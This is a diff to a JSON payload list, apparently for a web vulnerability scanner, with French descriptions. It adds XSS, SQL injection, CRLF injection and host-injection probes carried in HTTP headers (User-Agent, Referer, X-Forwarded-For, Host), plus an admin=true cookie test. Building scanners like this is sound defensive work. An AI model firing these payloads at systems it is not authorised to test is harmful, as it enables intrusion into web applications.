@@ -5,18 +5,32 @@
     "user_agent": [
       {"payload": "Mozilla/5.0 <script>alert(1)</script>",         "type": "xss",  "description": "XSS dans logs/analytics", "confidence_hint": 80, "depth": "basic"},
       {"payload": "Mozilla/5.0 ' OR 1=1-- ",                       "type": "sqli", "description": "SQLi dans UA stocké en DB", "confidence_hint": 75, "depth": "basic"},
-      {"payload": "Mozilla/5.0\r\nX-Injected: yes",                "type": "crlf", "description": "CRLF injection", "confidence_hint": 70, "depth": "extended"}
+      {"payload": "Mozilla/5.0\r\nX-Injected: yes",                "type": "crlf", "description": "CRLF injection", "confidence_hint": 70, "depth": "extended"},
+      {"payload": "Mozilla/5.0 <img src=x onerror=alert(1)>",      "type": "xss",  "description": "XSS via balise img dans tableau de bord analytics", "confidence_hint": 80, "depth": "extended"},
+      {"payload": "Mozilla/5.0\" onmouseover=\"alert(1)",          "type": "xss",  "description": "XSS en contexte attribut HTML (UA affiché dans <input value=\"...\">)", "confidence_hint": 75, "depth": "extended"},
+      {"payload": "Mozilla/5.0' UNION SELECT NULL,NULL-- -",       "type": "sqli", "description": "SQLi UNION-based via UA loggé en DB", "confidence_hint": 75, "depth": "aggressive"},
+      {"payload": "Mozilla/5.0%0d%0aSet-Cookie: injected=1",       "type": "crlf", "description": "CRLF injection encodée (pour appli qui décode la valeur avant de rebâtir la réponse)", "confidence_hint": 60, "depth": "aggressive"}
     ],
     "referer": [
       {"payload": "https://evil.com/<svg onload=alert(1)>",        "type": "xss",      "description": "XSS via Referer affiché", "confidence_hint": 70, "depth": "basic"},
-      {"payload": "https://evil.example.com",                      "type": "host-injection", "description": "Referer canary", "confidence_hint": 60, "depth": "basic"}
+      {"payload": "https://evil.example.com",                      "type": "host-injection", "description": "Referer canary", "confidence_hint": 60, "depth": "basic"},
+      {"payload": "https://evil.com/' OR '1'='1",                  "type": "sqli",     "description": "SQLi via Referer loggé en DB sans requête préparée", "confidence_hint": 70, "depth": "extended"},
+      {"payload": "https://evil.com/%0d%0aX-Injected: yes",        "type": "crlf",     "description": "CRLF injection via Referer (forme encodée)", "confidence_hint": 60, "depth": "aggressive"},
+      {"payload": "https://evil.com/\"><script>alert(1)</script>", "type": "xss",      "description": "XSS via Referer affiché dans un attribut HTML", "confidence_hint": 70, "depth": "extended"},
+      {"payload": "https://evil.com/'-alert(1)-'",                 "type": "xss",      "description": "XSS via Referer reflété dans un contexte JavaScript inline", "confidence_hint": 65, "depth": "aggressive"}
     ],
     "x_forwarded_for": [
       {"payload": "127.0.0.1' OR 1=1-- ",                          "type": "sqli",  "description": "SQLi via IP loggée en DB", "confidence_hint": 75, "depth": "extended"},
-      {"payload": "<svg onload=alert(1)>",                         "type": "xss",   "description": "XSS dans logs admin", "confidence_hint": 70, "depth": "basic"}
+      {"payload": "<svg onload=alert(1)>",                         "type": "xss",   "description": "XSS dans logs admin", "confidence_hint": 70, "depth": "basic"},
+      {"payload": "127.0.0.1%0d%0aX-Injected: yes",                "type": "crlf",  "description": "CRLF injection via X-Forwarded-For (forme encodée)", "confidence_hint": 60, "depth": "aggressive"},
+      {"payload": "127.0.0.1' UNION SELECT NULL-- -",              "type": "sqli",  "description": "SQLi UNION-based via IP loggée en DB", "confidence_hint": 75, "depth": "aggressive"},
+      {"payload": "127.0.0.1\"><script>alert(1)</script>",        "type": "xss",   "description": "XSS via IP affichée dans panel admin (contexte attribut)", "confidence_hint": 70, "depth": "extended"},
+      {"payload": "evil.example.com",                              "type": "host-injection", "description": "XFF traité comme un nom d'hôte de confiance sans validation de format IP", "confidence_hint": 55, "depth": "aggressive"}
     ],
     "host": [
-      {"payload": "evil.example.com",                              "type": "host-injection", "description": "Host canary", "confidence_hint": 75, "depth": "basic"}
+      {"payload": "evil.example.com",                              "type": "host-injection", "description": "Host canary", "confidence_hint": 75, "depth": "basic"},
+      {"payload": "evil.com\"><script>alert(1)</script>",          "type": "xss",            "description": "XSS via Host reflété dans message d'erreur / lien canonique", "confidence_hint": 65, "depth": "extended"},
+      {"payload": "evil.com' OR '1'='1",                           "type": "sqli",           "description": "SQLi via Host loggé (multi-tenancy par host)", "confidence_hint": 60, "depth": "aggressive"}
     ],
     "cookie": [
       {"payload": "admin=true",                                     "type": "privesc", "description": "Privesc via cookie", "confidence_hint": 50, "depth": "extended"}
